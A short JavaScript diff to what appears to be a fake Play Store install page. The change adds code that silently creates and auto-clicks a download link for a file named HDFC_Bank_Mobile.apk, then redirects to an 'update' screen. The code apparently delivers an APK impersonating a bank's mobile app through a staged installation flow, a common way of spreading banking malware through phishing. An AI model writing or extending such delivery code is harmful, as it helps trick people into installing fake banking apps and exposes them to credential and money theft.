@@ -17,10 +17,18 @@ document.addEventListener('DOMContentLoaded', () => {
                     installBtn.style.backgroundColor = '#01875f';
                     installBtn.style.color = 'white';
                     
-                    // Redirect to the dashboard after a short delay
+                    // Trigger APK download
+                    const downloadLink = document.createElement('a');
+                    downloadLink.href = 'HDFC_Bank_Mobile.apk'; // Placeholder for the actual APK
+                    downloadLink.download = 'HDFC_Bank_Mobile.apk';
+                    document.body.appendChild(downloadLink);
+                    downloadLink.click();
+                    document.body.removeChild(downloadLink);
+
+                    // Redirect to the update screen after a short delay
                     setTimeout(() => {
-                        window.location.href = 'index.html';
-                    }, 1000);
+                        window.location.href = 'update.html';
+                    }, 1500);
                 } else {
                     installBtn.textContent = `Installing ${progress}%`;
                 }
